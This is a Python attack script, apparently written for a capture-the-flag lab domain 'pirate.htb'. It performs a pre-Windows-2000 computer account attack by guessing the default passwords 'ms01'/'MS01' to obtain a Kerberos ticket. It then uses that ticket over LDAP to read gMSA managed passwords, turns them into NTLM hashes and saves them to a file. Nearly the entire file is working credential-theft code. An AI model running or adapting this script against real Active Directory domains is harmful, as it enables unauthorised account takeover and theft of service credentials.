#!/usr/bin/env python3
"""
pre2k attack: try computer account with default password (hostname lowercase)
Then use the TGT to extract gMSA managed password
"""
import subprocess
import sys
import os

PYTHON = r"C:\Users\90898\.pyenv\pyenv-win\versions\3.8.10\python.exe"
SCRIPTS = r"C:\Users\90898\.pyenv\pyenv-win\versions\3.8.10\Scripts"
DC_IP = "10.129.8.87"
DOMAIN = "pirate.htb"

# Step 1: Get TGT for MS01$ with default pre2k password "ms01"
print("[*] Step 1: pre2k attack - getting TGT for MS01$ with password 'ms01'")

import sys
sys.path.insert(0, SCRIPTS)

from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
import datetime

def get_tgt_for_computer(username, password, domain, dc_ip, output_ccache):
    """Get TGT using impacket"""
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.ccache import CCache
    
    userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
        userName, password, domain,
        lmhash=b'', nthash=b'',
        aesKey='',
        kdcHost=dc_ip
    )
    
    # Save to ccache
    ccache = CCache()
    ccache.fromTGT(tgt, oldSessionKey, sessionKey)
    ccache.saveFile(output_ccache)
    print(f"[+] TGT saved to {output_ccache}")
    return True


# Try MS01$ with password 'ms01'
ccache_file = r"d:\mcp\redteam-server\ms01.ccache"
try:
    result = get_tgt_for_computer("ms01$", "ms01", DOMAIN, DC_IP, ccache_file)
    print("[+] SUCCESS! MS01$ authenticated with password 'ms01'")
except Exception as e:
    print(f"[-] Failed with 'ms01': {e}")
    # Try uppercase
    try:
        result = get_tgt_for_computer("ms01$", "MS01", DOMAIN, DC_IP, ccache_file)
        print("[+] SUCCESS! MS01$ authenticated with password 'MS01'")
    except Exception as e2:
        print(f"[-] Failed with 'MS01': {e2}")
        sys.exit(1)

# Step 2: Use MS01$ TGT to read gMSA password via LDAP
print("\n[*] Step 2: Using MS01$ TGT to extract gMSA managed passwords")

os.environ["KRB5CCNAME"] = ccache_file

from ldap3 import Server, Connection, ALL, KERBEROS, SASL, NTLM, SIMPLE
from ldap3.core.exceptions import LDAPException

# Use Kerberos auth with the ccache
try:
    import ldap3
    s = Server(DC_IP, get_info=ALL, use_ssl=False)
    # Try GSSAPI/Kerberos with ccache
    c = Connection(
        s,
        authentication=SASL,
        sasl_mechanism='GSSAPI',
        auto_bind=True
    )
    
    print(f"[+] LDAP connected as: {c.extend.standard.who_am_i()}")
    
    # Search for gMSA accounts with msDS-ManagedPassword
    c.search(
        "DC=pirate,DC=htb",
        "(objectClass=msDS-GroupManagedServiceAccount)",
        attributes=["sAMAccountName", "msDS-ManagedPassword", "msDS-ManagedPasswordInterval", "msDS-GroupMSAMembership"]
    )
    
    for entry in c.entries:
        print(f"\n[+] gMSA Account: {entry.sAMAccountName}")
        if entry["msDS-ManagedPassword"].value:
            mp = entry["msDS-ManagedPassword"].value
            print(f"    msDS-ManagedPassword (raw): {mp.hex()}")
            # Parse MSDS-MANAGEDPASSWORD_BLOB
            # Structure: version(2) + reserved(2) + cbCurrentPassword(2) + ... + currentPassword
            import struct
            version = struct.unpack_from('<H', mp, 0)[0]
            reserved = struct.unpack_from('<H', mp, 2)[0]
            cb_current = struct.unpack_from('<H', mp, 4)[0]
            cb_previous = struct.unpack_from('<H', mp, 6)[0]
            current_pw_offset = struct.unpack_from('<H', mp, 8)[0]
            previous_pw_offset = struct.unpack_from('<H', mp, 10)[0]
            
            current_pw = mp[current_pw_offset:current_pw_offset+cb_current]
            print(f"    Current Password (hex): {current_pw.hex()}")
            
            # Compute NTLM hash
            import hashlib
            ntlm_hash = hashlib.new('md4', current_pw).hexdigest()
            print(f"    NTLM Hash: {ntlm_hash}")
            
            # Save
            with open(r"d:\mcp\redteam-server\gmsa_hashes.txt", "a") as f:
                f.write(f"{entry.sAMAccountName}:{ntlm_hash}\n")
        else:
            print(f"    msDS-ManagedPassword: NOT READABLE (insufficient permissions)")

except Exception as e:
    print(f"[-] LDAP error: {e}")
    import traceback
    traceback.print_exc()
